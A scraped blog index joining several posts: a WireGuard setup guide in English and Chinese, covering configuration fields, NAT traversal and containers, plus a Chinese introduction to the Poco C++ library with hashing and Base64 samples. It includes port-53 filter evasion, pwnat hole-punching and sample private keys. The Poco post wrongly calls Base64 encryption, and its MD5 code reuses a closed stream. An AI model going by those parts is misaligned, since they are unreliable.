don’t have an ad blocker. To specify DNS servers, add the DNS option to the client’s [Interface] block: [Interface] … DNS = 176.103.130.130,176.103.130.131 Bypassing blocked ports and filtered connections WireGuard uses UDP. A well-known way to bypass blocked ports with OpenVPN is to use TCP on the port 443 to simulate HTTPS, but it’s slower. On both OpenVPN and WireGuard, I usually connect to the port 53 via UDP, since DNS is never blocked (unless your network does DPI…). Transferring a configuration file easily to the Android app I mean it’s not that difficult to transfer a file from my computer to my Android phone, but there is an even better way. On the Android App, you have 3 means to create an interface: Create from file or archive Create from a QR Code Create from scratch It’s super easy to generate a QR Code on your computer using qrencode: qrencode -t ansiutf8 &lt; wireguard-android.conf Scan the QR Code in your terminal with your phone, and you’re done. Configuration overview 12345678910111213141516171819202122232425262728293031323334353637# Peer 1 (server)[Interface]Address = 10.66.66.1/24,fd42:42:42::1/64PostUp = iptables -t nat -A POSTROUTING -o ens3 -j MASQUERADE; ip6tables -t nat -A POSTROUTING -o ens3 -j MASQUERADEPostDown = iptables -t nat -D POSTROUTING -o ens3 -j MASQUERADE; ip6tables -t nat -D POSTROUTING -o ens3 -j MASQUERADEListenPort = 53PrivateKey = &lt;server private key&gt;[Peer]PublicKey = &lt;client 1 public key&gt;AllowedIPs = 10.66.66.2/32, fd42:42:42::2/128[Peer]PublicKey = &lt;client 2 public key&gt;AllowedIPs = 10.66.66.3/32, fd42:42:42::3/128# Peer 2 (client 1)[Interface]PrivateKey = &lt;client 1 private key&gt;Address = 10.66.66.2/24,fd42:42:42::2/64DNS = 176.103.130.130,176.103.130.131[Peer]PublicKey = &lt;server public key&gt;Endpoint = &lt;server public IP&gt;:53AllowedIPs = 0.0.0.0/0,::/0# Peer 3 (client 2)[Interface]PrivateKey = &lt;client 1 private key&gt;Address = 10.66.66.3/24,fd42:42:42::3/64DNS = 176.103.130.130,176.103.130.131[Peer]PublicKey = &lt;server public key&gt;Endpoint = &lt;server public IP&gt;:53AllowedIPs = 0.0.0.0/0,::/0 Conclusion WireGuard is super awesome and easy to setup. Thanks to this, I can connect safely (encryption) from nearly anywhere (port 53), get IPv6 connection (dual-stack) while blocking ads (AdGuard) and having great speeds! WireGuard is still being actively developed, and has received lots of support and donations. I have been using it for months to connect servers to each other (blog post incoming), and I never had any issue. windows 客户端：https://download.wireguard.com/windows-client/wireguard-amd64-0.5.3.msi 配置详解 WireGuard 使用 INI 语法作为其配置文件格式。配置文件可以放在任何路径下，但必须通过绝对路径引用。默认路径是 /etc/wireguard/wg0.conf。配置文件的命名形式必须为 ${WireGuard 接口的名称}.conf。通常情况下 WireGuard 接口名称以 wg 为前缀，并从 0 开始编号，但你也可以使用其他名称，只要符合正则表达式 ^[a-zA-Z0-9_=+.-]&#123;1,15&#125;$ 就行。你可以选择使用 wg 命令来手动配置 VPN，但一般建议使用 wg-quick，它提供了更强大和用户友好的配置体验，可以通过配置文件来管理配置。 [Interface] 这一节定义本地 VPN 配置。 例如：本地节点是客户端，只路由自身的流量，只暴露一个 IP。 [Interface] /# Name = phone.example-vpn.dev Address = 192.0.2.5/32 PrivateKey = 本地节点是中继服务器，它可以将流量转发到其他对等节点（peer），并公开整个 VPN 子网的路由。 [Interface] /# Name = public-server1.example-vpn.tld Address = 192.0.2.1/24 ListenPort = 51820 PrivateKey = DNS = 1.1.1.1 Name 这是 INI 语法中的标准注释，用于展示该配置部分属于哪个节点。这部分配置会被 WireGuard 完全忽略，对 VPN 的行为没有任何影响。 Address 定义本地节点应该对哪个地址范围进行路由。如果是常规的客户端，则将其设置为节点本身的单个 IP（使用 CIDR 指定，例如 192.0.2.3/32）；如果是中继服务器，则将其设置为可路由的子网范围。例如： 常规客户端，只路由自身的流量：Address = 192.0.2.3/32 中继服务器，可以将流量转发到其他对等节点（peer）：Address = 192.0.2.1/24 也可以指定多个子网或 IPv6 子网：Address = 192.0.2.1/24,2001:DB8::/64 ListenPort 当本地节点是中继服务器时，需要通过该参数指定端口来监听传入 VPN 连接，默认端口号是 51820。常规客户端不需要此 PrivateKey 本地节点的私钥，所有节点（包括中继服务器）都必须设置。不可与其他服务器共用。私钥可通过命令 wg genkey &gt; example.key 来生成。 DNS 通过 DHCP 向客户端宣告 DNS 服务器。客户端将会使用这里指定的 DNS 服务器来处理 VPN 子网中的 DNS 请求，但也可以在系统中覆盖此选项。例如：如果不配置则使用系统默认 DNS 可以指定单个 DNS：DNS = 1.1.1.1 也可以指定多个 DNS：DNS = 1.1.1.1,8.8.8.8 Table 定义 VPN 子网使用的路由表，默认不需要设置。该参数有两个特殊的值需要注意： Table = off : 禁止创建路由 Table = auto（默认值） : 将路由添加到系统默认的 table 中，并启用对默认路由的特殊处理。 例如：Table = 1234 MTU 定义连接到对等节点（peer）的 MTU（Maximum Transmission Unit，最大传输单元），默认不需要设置，一般由系统自动确定。 PreUp 启动 VPN 接口之前运行的命令。这个选项可以指定多次，按顺序执行。例如： 添加路由：PreUp = ip rule add ipproto tcp dport 22 table 1234 PostUp 启动 VPN 接口之后运行的命令。这个选项可以指定多次，按顺序执行。 从文件或某个命令的输出中读取配置值： PostUp = wg set %i private-key /etc/wireguard/wg0.key &lt;(some command here) 添加一行日志到文件中： PostUp = echo “$(date +%s) WireGuard Started” &gt;&gt; /var/log/wireguard.log 调用 WebHook： PostUp = curl https://events.example.dev/wireguard/started/?key=abcdefg 添加路由： PostUp = ip rule add ipproto tcp dport 22 table 1234 添加 iptables 规则，启用数据包转发： PostUp = iptables -A FORWARD -i %i -j ACCEPT; iptables -A FORWARD -o %i -j ACCEPT; iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE 强制 WireGuard 重新解析对端域名的 IP 地址： PostUp = resolvectl domain %i “~.”; resolvectl dns %i 192.0.2.1; resolvectl dnssec %i yes PreDown 停止 VPN 接口之前运行的命令。这个选项可以指定多次，按顺序执行。例如： 添加一行日志到文件中： PreDown = echo “$(date +%s) WireGuard Going Down” &gt;&gt; /var/log/wireguard.log 调用 WebHook： PreDown = curl https://events.example.dev/wireguard/stopping/?key=abcdefg PostDown 停止 VPN 接口之后运行的命令。这个选项可以指定多次，按顺序执行。例如： 添加一行日志到文件中： PostDown = echo “$(date +%s) WireGuard Going Down” &gt;&gt; /var/log/wireguard.log 调用 WebHook： PostDown = curl https://events.example.dev/wireguard/stopping/?key=abcdefg 删除 iptables 规则，关闭数据包转发： PostDown = iptables -D FORWARD -i %i -j ACCEPT; iptables -D FORWARD -o %i -j ACCEPT; iptables -t nat -D POSTROUTING -o eth0 -j MASQUERADE [Peer] 定义能够为一个或多个地址路由流量的对等节点（peer）的 VPN 设置。对等节点（peer）可以是将流量转发到其他对等节点（peer）的中继服务器，也可以是通过公网或内网直连的客户端。 中继服务器必须将所有的客户端定义为对等节点（peer），除了中继服务器之外，其他客户端都不能将位于 NAT 后面的节点定义为对等节点（peer），因为路由不可达。对于那些只为自己路由流量的客户端，只需将中继服务器作为对等节点（peer），以及其他需要直接访问的节点。 举个例子，在下面的配置中，public-server1 作为中继服务器，其他的客户端有的是直连，有的位于 NAT 后面： public-server1（中继服务器） [peer] : public-server2, home-server, laptop, phone public-server2（直连客户端） [peer] : public-server1 home-server（客户端位于 NAT 后面） [peer] : public-server1, public-server2 laptop（客户端位于 NAT 后面） [peer] : public-server1, public-server2 phone（客户端位于 NAT 后面） [peer] : public-server1, public-server2 配置示例： 对等节点（peer）是路由可达的客户端，只为自己路由流量 [Peer] /# Name = public-server2.example-vpn.dev Endpoint = public-server2.example-vpn.dev:51820 PublicKey = AllowedIPs = 192.0.2.2/32 对等节点（peer）是位于 NAT 后面的客户端，只为自己路由流量 [Peer] /# Name = home-server.example-vpn.dev Endpoint = home-server.example-vpn.dev:51820 PublicKey = AllowedIPs = 192.0.2.3/32 对等节点（peer）是中继服务器，用来将流量转发到其他对等节点（peer） [Peer] /# Name = public-server1.example-vpn.tld Endpoint = public-server1.example-vpn.tld:51820 PublicKey = /# 路由整个 VPN 子网的流量 AllowedIPs = 192.0.2.1/24 PersistentKeepalive = 25 Endpoint 指定远端对等节点（peer）的公网地址。如果对等节点（peer）位于 NAT 后面或者没有稳定的公网访问地址，就忽略这个字段。通常只需要指定中继服务器的 Endpoint，当然有稳定公网 IP 的节点也可以指定。例如： 通过 IP 指定： Endpoint = 123.124.125.126:51820 通过域名指定： Endpoint = public-server1.example-vpn.tld:51820 AllowedIPs 允许该对等节点（peer）发送过来的 VPN 流量中的源地址范围。同时这个字段也会作为本机路由表中 wg0 绑定的 IP 地址范围。如果对等节点（peer）是常规的客户端，则将其设置为节点本身的单个 IP；如果对等节点（peer）是中继服务器，则将其设置为可路由的子网范围。可以使用 , 来指定多个 IP 或子网范围。该字段也可以指定多次。 当决定如何对一个数据包进行路由时，系统首先会选择最具体的路由，如果不匹配再选择更宽泛的路由。例如，对于一个发往 192.0.2.3 的数据包，系统首先会寻找地址为 192.0.2.3/32 的对等节点（peer），如果没有再寻找地址为 192.0.2.1/24 的对等节点（peer），以此类推。例如： 对等节点（peer）是常规客户端，只路由自身的流量： AllowedIPs = 192.0.2.3/32 对等节点（peer）是中继服务器，可以将流量转发到其他对等节点（peer）： AllowedIPs = 192.0.2.1/24 对等节点（peer）是中继服务器，可以转发所有的流量，包括外网流量和 VPN 流量，可以用来干嘛你懂得： AllowedIPs = 0.0.0.0/0,::/0 对等节点（peer）是中继服务器，可以路由其自身和其他对等节点（peer）的流量： AllowedIPs = 192.0.2.3/32,192.0.2.4/32 对等节点（peer）是中继服务器，可以路由其自身的流量和它所在的内网的流量： AllowedIPs = 192.0.2.3/32,192.168.1.1/24 PublicKey 对等节点（peer）的公钥，所有节点（包括中继服务器）都必须设置。可与其他对等节点（peer）共用同一个公钥。 公钥可通过命令 wg pubkey &lt; example.key &gt; example.key.pub 来生成，其中 example.key 是上面生成的私钥。 例如：PublicKey = somePublicKeyAbcdAbcdAbcdAbcd= PersistentKeepalive 如果连接是从一个位于 NAT 后面的对等节点（peer）到一个公网可达的对等节点（peer），那么 NAT 后面的对等节点（peer）必须定期发送一个出站 ping 包来检查连通性，如果 IP 有变化，就会自动更新Endpoint。例如： 本地节点与对等节点（peer）可直连：该字段不需要指定，因为不需要连接检查。 对等节点（peer）位于 NAT 后面：该字段不需要指定，因为维持连接是客户端（连接的发起方）的责任。 本地节点位于 NAT 后面，对等节点（peer）公网可达：需要指定该字段 PersistentKeepalive = 25，表示每隔 25 秒发送一次 ping 来检查连接。 高级特性 IPv6 前面的例子主要使用 IPv4，WireGuard 也支持 IPv6。例如： [Interface] AllowedIps = 192.0.2.3/24, 2001:DB8::/64 [Peer] … AllowedIPs = 0.0.0.0/0, ::/0 转发所有流量 如果你想通过 VPN 转发所有的流量，包括 VPN 子网和公网流量，需要在 [Peer] 的 AllowedIPs 中添加 0.0.0.0/0, ::/0。 即便只转发 IPv4 流量，也要指定一个 IPv6 网段，以避免将 IPv6 数据包泄露到 VPN 之外。详情参考：reddit.com/r/WireGuard/comments/b0m5g2/ipv6_leaks_psa_for_anyone_here_using_wireguard_to 例如： [Interface] /# Name = phone.example-vpn.dev Address = 192.0.2.3/32 PrivateKey = [Peer] /# Name = public-server1.example-vpn.dev PublicKey = Endpoint = public-server1.example-vpn.dev:51820 AllowedIPs = 0.0.0.0/0, ::/0 一般只有把 VPN 当做武当纵云梯来用时，才会需要转发所有流量，不多说，点到为止。 NAT-to-NAT 连接 如果两个对等节点（peer）都位于 NAT 后面，想不通过中继服务器直接连接，需要保证至少有一个对等节点（peer）具有稳定的公网出口，使用静态公网 IP 或者通过 DDNS 动态更新 FQDN 都可以。 WebRTC 协议可以动态配置两个 NAT 之间的连接，它可以通过信令服务器来检测每个主机的 IP:Port 组合。而 WireGuard 没有这个功能，它没有没有信令服务器来动态搜索其他主机，只能硬编码 Endpoint+ListenPort，并通过 PersistentKeepalive 来维持连接。 总结一下 NAT-to-NAT 连接的前提条件： 至少有一个对等节点（peer）有固定的公网 IP，如果都没有固定的公网 IP，也可以使用 DDNS 来维护一个稳定的域名。 至少有一个对等节点（peer）指定 UDP ListenPort，而且它的 NAT 路由器不能做 UDP 源端口随机化，否则返回的数据包将被发送到之前指定的 ListenPort，并被路由器丢弃，不会发送到新分配的随机端口。 所有的对等节点（peer）必须在 [Peer] 配置中启用其他对等节点（peer）的 PersistentKeepalive，这样就可以维持连接的持久性。 对于通信双方来说，只要服务端所在的 NAT 路由器没有指定到 NAT 后面的对等节点（peer）的转发规则，就需要进行 UDP 打洞。 UDP 打洞的原理： Peer1 向 Peer2 发送一个 UDP 数据包，不过 Peer2 的 NAT 路由器不知道该将这个包发给谁，直接丢弃了，不过没关系，这一步的目的是让 Peer1 的 NAT 路由器能够接收 UDP 响应并转发到后面的 Peer1。 Peer2 向 Peer1 发送一个 UDP 数据包，由于上一步的作用，Peer1 的 NAT 路由器已经建立临时转发规则，可以接收 UDP 响应，所以可以接收到该数据包，并转发到 Peer1。 Peer1 向 Peer2 发送一个 UDP 响应，由于上一步的作用，由于上一步的作用，Peer2 的 NAT 路由器已经可以接收 UDP 响应，所以可以接收到该数据包，并转发到 Peer2。 这种发送一个初始的数据包被拒绝，然后利用路由器已建立的转发规则来接收响应的过程被称为 『UDP 打洞』。 当你发送一个 UDP 数据包出去时，路由器通常会创建一个临时规则来映射源地址/端口和目的地址/端口，反之亦然。从目的地址和端口返回的 UDP 数据包会被转发到原来的源地址和端口，这就是大多数 UDP 应用在 NAT 后面的运作方式（如 BitTorrent、Skype 等）。这个临时规则会在一段时间后失效，所以 NAT 后面的客户端必须通过 PersistentKeepalive 定期发送数据包来维持连接的持久性。 当两个对等节点（peer）都位于 NAT 后面时，要想让 UDP 打洞生效，需要两个节点在差不多的时间向对方发送数据包，这就意味着双方需要提前知道对方的公网地址和端口号，可以在 wg0.conf 中指定。 UDP 打洞的局限性 从 2019 年开始，很多以前用过的老式打洞方法都不再有效了。以前很著名的就是 pwnat 开创的一种新的打洞方法，它能够在不需要代理、第三方服务器、upnp、DMZ、sproofing、dns 转换的情况下实现 NAT 中的 P2P 通信。它的原理也很简单： 通过让客户端假装成为一个互联网上任意的 ICMP 跳跃点（ a random hop on the Internet）来解决这个问题，从而让服务端能够获取到客户端的 IP 地址。traceroute 命令也是使用这项技术来检测 Internet 上的跳跃点。 具体来说，当服务器启动时，它开始向固定地址 3.3.3.3 发送固定的 ICMP 回应请求包（ICMP echo request packets）。显然，我们无法从 3.3.3.3 收到返回的 ICMP 回应数据包（ICMP echo packets）。然而，3.3.3.3 并不是我们可以访问的主机，我们也不是想伪装成它来发 ICMP 回应数据包。相反，pwnat 技术的实现原理在于，当我们的客户端想要连接服务端时，客户端（知道服务器IP地址）会向服务端送 ICMP 超时数据包（ICMP Time Exceeded packet）。 这个 ICMP 数据包里面包含了服务端发送到 3.3.3.3 的原始固定 ICMP 回应请求包。 为什么要这样做呢？好吧，我们假装是互联网上的一个 ICMP 跳越点，礼貌地告诉服务器它原来的 ICMP 回应请求包无法传递到 3.3.3.3。而你的 NAT 是一个聪明的设备，它会注意到 ICMP 超时数据包内的数据包与服务器发出 ICMP 回应请求包相匹配。然后它将 ICMP 超时数据包转发回 NAT 后面的服务器，包括来自客户端的完整 IP 数据包头，从而让服务端知道客户端 IP 地址是什么！ 现在这种类似的 UDP 打洞方法受到了很多的限制，详情可以参考上篇文章，这里不过多阐述。除了 UDP 打洞之外，我们仍然可以使用硬编码的方式指定两个对等节点（peer）的公网地址和端口号，这个方法对大多数 NAT 网络都有效。 源端口随机化 如果所有的对等节点（peer）都在具有严格的 UDP 源端口随机化的 NAT 后面（比如大多数蜂窝网络），那么无法实现 NAT-to-NAT 连接。因为双方都无法协商出一个 ListenPort，并保证自己的 NAT 在发出 ping 包后能够接收发往该端口的流量，所以就无法初始化打洞，导致连接失败。因此，一般在 LTE/3G 网络中无法进行 p2p 通信。 使用信令服务器 上节提到了，如果所有的对等节点（peer）都在具有严格的 UDP 源端口随机化的 NAT 后面，就无法直接实现 NAT-to-NAT 连接，但通过第三方的信令服务器是可以实现的。信令服务器相当于一个中转站，它会告诉通信双方关于对方的 IP:Port 信息。这里有几个项目可以参考： takutakahashi/wg-connect git.zx2c4.com/wireguard-tools/tree/contrib/nat-hole-punching 动态 IP 地址 WireGuard 只会在启动时解析域名，如果你使用 DDNS 来动态更新域名解析，那么每当 IP 发生变化时，就需要重新启动 WireGuard。目前建议的解决方案是使用 PostUp 钩子每隔几分钟或几小时重新启动 WireGuard 来强制解析域名。 总的来说，NAT-to-NAT 连接极为不稳定，而且还有一堆其他的限制，所以还是建议通过中继服务器来通信。 动态分配子网 IP 这里指的是对等节点（peer）的 VPN 子网 IP 的动态分配，类似于 DHCP，不是指 Endpoint。 WireGuard 官方已经在开发动态分配子网 IP 的功能，具体的实现可以看这里：WireGuard/wg-dynamic 当然，你也可以使用 PostUp 在运行时从文件中读取 IP 值来实现一个动态分配 IP 的系统，类似于 Kubernetes 的 CNI 插件。例如： [Interface] … PostUp = wg set %i allowed-ips /etc/wireguard/wg0.key &lt;(some command) 奇技淫巧 共享一个 peers.conf 文件 介绍一个秘密功能，可以简化 WireGuard 的配置工作。如果某个 peer 的公钥与本地接口的私钥能够配对，那么 WireGuard 会忽略该 peer。利用这个特性，我们可以在所有节点上共用同一个 peer 列表，每个节点只需要单独定义一个 [Interface] 就行了，即使列表中有本节点，也会被忽略。具体方式如下： 每个对等节点（peer）都有一个单独的 /etc/wireguard/wg0.conf 文件，只包含 [Interface] 部分的配置。 每个对等节点（peer）共用同一个 /etc/wireguard/peers.conf 文件，其中包含了所有的 peer。 Wg0.conf 文件中需要配置一个 PostUp 钩子，内容为 PostUp = wg addconf /etc/wireguard/peers.conf。 关于 peers.conf 的共享方式有很多种，你可以通过 ansible 这样的工具来分发，可以使用 Dropbox 之类的网盘来同步，当然也可以使用 ceph 这种分布式文件系统来将其挂载到不同的节点上。 从文件或命令输出中读取配置 WireGuard 也可以从任意命令的输出或文件中读取内容来修改配置的值，利用这个特性可以方便管理密钥，例如可以在运行时从 Kubernetes Secrets 或 AWS KMS 等第三方服务读取密钥。 容器化 WireGuard 也可以跑在容器中，最简单的方式是使用 --privileged 和 --cap-add=all 参数，让容器可以加载内核模块。 你可以让 WireGuard 跑在容器中，向宿主机暴露一个网络接口；也可以让 WireGuard 运行在宿主机中，向特定的容器暴露一个接口。 下面给出一个具体的示例，本示例中的 vpn_test 容器通过 WireGuard 中继服务器来路由所有流量。本示例中给出的容器配置是 docker-compose 的配置文件格式。 中继服务器容器配置： 12345678910111213version: &#x27;3&#x27;services: wireguard: image: linuxserver/wireguard ports: - 51820:51820/udp cap_add: - NET_ADMIN - SYS_MODULE volumes: - /lib/modules:/lib/modules - ./wg0.conf:/config/wg0.conf:ro 中继服务器 WireGuard 配置 wg0.conf： 12345678910111213[Interface]# Name = relay1.wg.example.comAddress = 192.0.2.1/24ListenPort = 51820PrivateKey = oJpRt2Oq27vIB5/UVb7BRqCwad2YMReQgH5tlxz8YmI=DNS = 1.1.1.1,8.8.8.8PostUp = iptables -A FORWARD -i wg0 -j ACCEPT; iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE; ip6tables -A FORWARD -i wg0 -j ACCEPT; ip6tables -t nat -A POSTROUTING -o eth0 -j MASQUERADEPostDown = iptables -D FORWARD -i wg0 -j ACCEPT; iptables -t nat -D POSTROUTING -o eth0 -j MASQUERADE; ip6tables -D FORWARD -i wg0 -j ACCEPT; ip6tables -t nat -D POSTROUTING -o eth0 -j MASQUERADE[Peer]# Name = peer1.wg.example.comPublicKey = I+hXRAJOG/UE2IQvIHsou2zTgkUyPve2pzvHTnd/2Gg=AllowedIPs = 192.0.2.2/32 客户端容器配置： 12345678910111213141516version: &#x27;3&#x27;services: wireguard: image: linuxserver/wireguard cap_add: - NET_ADMIN - SYS_MODULE volumes: - /lib/modules:/lib/modules - ./wg0.conf:/config/wg0.conf:ro vpn_test: image: curlimages/curl entrypoint: curl -s http://whatismyip.akamai.com/ network_mode: &#x27;service:wireguard&#x27; 客户端 WireGuard 配置 wg0.conf： 123456789101112[Interface]# Name = peer1.wg.example.comAddress = 192.0.2.2/32PrivateKey = YCW76edD4W7nZrPbWZxPZhcs32CsBLIi1sEhsV/sgk8=DNS = 1.1.1.1,8.8.8.8[Peer]# Name = relay1.wg.example.comEndpoint = relay1.wg.example.com:51820PublicKey = zJNKewtL3gcHdG62V3GaBkErFtapJWsAx+2um0c0B1s=AllowedIPs = 192.0.2.1/24,0.0.0.0/0PersistentKeepalive = 21 ※全互联模式（full mesh） 全互联模式其实就是一种网络连接形式，即所有结点之间都直接连接，不会通过第三方节点中转流量。和前面提到的点对多点架构其实是一个意思。 在 WireGuard 的世界里没有 Server 和 Client 之分，所有的节点都是 Peer。大家使用 WireGuard 的常规做法是找一个节点作为中转节点，也就是 VPN 网关，然后所有的节点都和这个网关进行连接，所有节点之间都通过这个网关来进行通信。这种架构中，为了方便理解，我们可以把网关看成 Server，其他的节点看成 Client，但实际上是不区分 Server 和 Client 的。 wg-gen-web 就是这样一款图形管理界面，主要包含以下这些功能： 根据 CIDR 自动分配 IP 地址给客户端； 每个客户端会生成 QR 二维码，方便移动客户端扫描使用； 支持通过邮件发送二维码和配置文件； 支持启用和禁用某个客户端； 支持 IPv6； 支持使用 GitHub 和 Oauth2 OIDC 来进行用户认证； 颜值还比较高。 wg-meshconf is a tool that will help you to generate peer configuration files for WireGuard mesh networks. You can easily and quickly create WireGuard mesh networks using this tool. Refenrence: Wireguard 全互联模式（full mesh）权威指南 有了这款图形管理界面，一分钟内配置 10 个 WireGuard 客户端不是梦","tags":""},{"title":"poco库学习","url":"/20240522/poco-ku-xue-xi/","text":"POCO库是强大的的跨平台C库，可以用来编写多平台的网络应用程序，这些平台包括桌面端、服务端、移动端、IOT(物联网)、嵌入式系统等。总的来说是一个非常强大的综合性库。Poco 是一个开源的、跨平台的C库，它提供了大量的基础工具和服务，旨在简化和加速软件开发过程。该项目由Poco Software Foundation维护，拥有广泛的社区支持，并在各种工业级应用中被广泛采用。Poco是一个功能丰富、易于使用的跨平台C++开发框架，全称为&quot;POrtable COmponents&quot;，它提供了一系列的类库和工具，用于开发跨平台、高性能、可扩展的应用程序。 项目地址:https://gitcode.com/pocoproject/poco ※为什么使用Poco库？ 支持跨平台 性能表现优异 API使用方便,便于上手 库可以拆分使用,容易实现轻量化调用 功能模块丰富 Poco C++库是在Boost软件许可证下授权的，既可以用来开发非商业应用，也可以用来开发商业应用。可以说是可以自由使用的了。 ※POCO库都能做哪些事？ 根据Poco官方文档介绍Poco库支持的功能组如下： 类型和字节序操作 错误处理和调试 内存管理 字符串和文本的格式化 平台和环境的操作和处理 随机数生成和各种哈希算法 时间和日期处理 文件操作系统处理 通知和事件 各种流处理 日志操作 动态的库操作 进程管理 url和uuid的生成和操作 XML和Json文件操作 网络编程 客户端程序和网络程序的编写 文件系统的支持和配置 日志系统的配置 总的来说就是能用到的功能poco库都支持，可以说是非常强大了。 ※技术分析 Poco 库包含多个模块，涵盖了网络编程、XML处理、数据库接口、加密、日期/时间操作、日志记录、JSON解析等多种功能。以下是其核心组件和技术亮点： 网络编程：Poco 提供了全面的网络API，包括HTTP、HTTPS、FTP、SMTP、SOCKS等协议的支持，使得开发者可以轻松创建网络客户端和服务端应。 数据存取：Poco 包含ODBC和JDBC桥接器，允许无缝连接到多种关系型数据库系统，同时还提供了一个SQLite嵌入式数据库引擎。 加密与安全性：内置了OpenSSL库的封装，支持SSL/TLS加密，可用于安全的网络通信和证书管理。 XML和JSON解析：Poco 提供了高效的XML和JSON解析器与生成器，便于数据交换和配置文件处理。 线程与并发：提供线程管理和同步原语，使得多线程编程变得更简单，同时也支持异步事件模型。 日志系统：灵活的日志记录机制，可自定义输出级别、格式和目标，方便调试和监控。 国际化和本地化：支持多种语言和地区的字符串处理，为全球化的应用程序提供便利。 跨平台兼容性：Poco 可在Windows、Linux、macOS、iOS、Android等多个操作系统上运行，实现了良好的平台一致性。 ※应用场景 由于其丰富的功能和灵活性，Poco 在以下场景中尤其有用： 建立高性能的Web服务或API。 开发需要网络通信的桌面应用，如文件传输工具。 构建复杂的分布式系统，利用其并发和线程管理能力。 数据处理和存储，无论是本地还是远程数据库。 创建安全的应用程序，例如需要加密和身份验证的系统。 编写需要多语言支持的国际化应用。 ※特点与优势 高效性：Poco 库设计精良，注重性能优化，代码轻量且易于集成。 模块化：各个组件独立，可根据需要选择使用，避免了不必要的资源开销。 易用性：API 设计简洁，文档详尽，便于学习和使用。 活跃的社区：社区成员积极贡献代码，定期更新，问题解决速度快。 广泛的依赖项管理：兼容CMake，可以与其他开源项目轻松配合。 ※Poco库的一些主要特点和功能 跨平台支持：Poco库支持多个操作系统，包括Windows、Linux、macOS等，使得开发者可以编写可移植的代码。它提供了对操作系统API的抽象封装，简化了跨平台开发过程。 组件化设计：Poco库的设计基于组件化思想，将常用的功能封装成独立的可重用组件。每个组件都提供了清晰而一致的接口，开发者可以根据需选择并使用适当的组件。 网络和通信：Poco库提供了强大而易用的网络和通信功能，包括HTTP、SMTP、POP3、FTP、WebSocket、TCP/UDP等协议的支持，以及HTTP服器和客户端的实现。 数据库访问：Poco库具有对多种数据库的支持，包括MySQL、SQLite、PostgreSQL、Oracle等。它提供了简单而灵活的接口，方便进行数据库接、查询和事务处理。 加密和安全：Poco库提供了包括AES、RSA、HMAC、SSL等在内的各种加密算法的支持，以及摘要、签名、证书管理等安全功能。 多线程和并发：Poco库提供了多线程和并发编程的支持，包括线程、互斥锁、条件变量、线程池等工具，方便编写高效的并发代码。 XML和JSON处理：Poco库提供了对XML和JSON格式的解析、生成和处理的支持，方便开发者进行配置文件解析、数据交换等操作。 文件系统和IO操作：Poco库提供了强大的文件系统和IO操作功能，包括文件读写、目录遍历、文件监控等，简化了文件和目录处理的过程。 单元测试和文档生成：Poco库内置了用于单元测试和文档生成的工具集，方便开发者进行代码测试、文档编写和生成。 ※源码下载和库编译？ Poco库的官网地址https://pocoproject.org/index.html Poco库的项目地址https://github.com/pocoproject/poco/tree/master Poco库可以根据使用需求不同，编译成静态库或者动态库，编译方法很简单，这里就不再做详细介绍了。 ※Poco库常用功能 MD5值计算、Base64加密计算、HMAC-MD5计算 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109#include &lt;iostream&gt;#include &lt;fstream&gt;#include &lt;sstream&gt; //MD5值的计算#include &quot;Poco\\MD5Engine.h&quot;#include &quot;Poco\\DigestStream.h&quot;#include &quot;Poco\\StreamCopier.h&quot; using Poco::DigestEngine;using Poco::MD5Engine;using Poco::DigestOutputStream;using Poco::StreamCopier; //base64的计算#include &quot;Poco\\Base64Decoder.h&quot;#include &quot;Poco\\StreamCopier.h&quot;#include &quot;Poco\\Base64Encoder.h&quot; using Poco::Base64Encoder;using Poco::StreamCopier;using Poco::Base64Decoder; //计算HMAC-MD5值#include &quot;Poco/HMACEngine.h&quot;#include &quot;Poco/MD5Engine.h&quot;#include &quot;Poco/DigestStream.h&quot;#include &quot;Poco/StreamCopier.h&quot;#include &lt;fstream&gt;#include &lt;iostream&gt; using Poco::DigestEngine;using Poco::HMACEngine;using Poco::MD5Engine;using Poco::DigestOutputStream;using Poco::StreamCopier; using namespace std;int main(int argc, char** argv)&#123; //计算文件的MD5值 ifstream inputStream(&quot;test.txt&quot;, ios::binary); MD5Engine md5; DigestOutputStream dos(md5); StreamCopier::copyStream(inputStream, dos); dos.close(); cout &lt;&lt; DigestEngine::digestToHex(md5.digest()) &lt;&lt; std::endl; cout &lt;&lt; &quot;完成md5值的计算&quot; &lt;&lt; endl; //计算字符串的MD5值 std::string INPUT_STRING = &quot;hello&quot;; stringstream stringStream(INPUT_STRING); StreamCopier::copyStream(stringStream, dos); dos.close(); cout &lt;&lt; DigestEngine::digestToHex(md5.digest()) &lt;&lt; std::endl; cout &lt;&lt; &quot;字符串md5值计算完毕&quot; &lt;&lt; endl; //对文件进行base64加密 ifstream base64EncodeInputStream(&quot;test.txt&quot;, ios::binary); ofstream base64EncodeOutputStream(&quot;encoderesult.txt&quot;); Base64Encoder encoder(base64EncodeOutputStream); StreamCopier::copyStream(base64EncodeInputStream, encoder); cout &lt;&lt; &quot;完成base64加密&quot; &lt;&lt; endl; encoder.close(); //对文件进行解密 ofstream base64DecodeOutputStream(&quot;decoderesult.txt&quot;); ifstream base64DecodeInputStream(&quot;encoderesult.txt&quot;); Base64Decoder decoder(base64DecodeInputStream); StreamCopier::copyStream(decoder,base64DecodeOutputStream); //对字符串进行加密 stringstream strbase64encodeinputstream(string(&quot;ceshibase64&quot;)); string strbase64encodeoutputStr; stringstream strencodeOutputStream; Base64Encoder stringencodr(strencodeOutputStream); StreamCopier::copyStream(strbase64encodeinputstream, stringencodr); stringencodr.close(); strencodeOutputStream &gt;&gt; strbase64encodeoutputStr; //对字符串进行解密 stringstream strdecodeInputstream(strbase64encodeoutputStr); stringstream strdecodeOutputstream; string decodeResult; Base64Decoder stringdecoder(strdecodeInputstream); StreamCopier::copyStream(stringdecoder, strdecodeOutputstream); strdecodeOutputstream &gt;&gt; decodeResult; //计算文件的HMAC-MD5值 string passphrase(&quot;hmac-key&quot;); ifstream hmacinputStream(&quot;test.txt&quot;, ios::binary); HMACEngine&lt;MD5Engine&gt; hmac(passphrase); DigestOutputStream hmacdos(hmac); StreamCopier::copyStream(hmacinputStream, hmacdos); hmacdos.close(); cout &lt;&lt; DigestEngine::digestToHex(hmac.digest()) &lt;&lt; std::endl; //计算字符串的HMAC-MD5值 stringstream hmacStrinputStream(&quot;ceshishiyong&quot;); HMACEngine&lt;MD5Engine&gt; hStrmac(passphrase); DigestOutputStream hmaStrcdos(hStrmac); 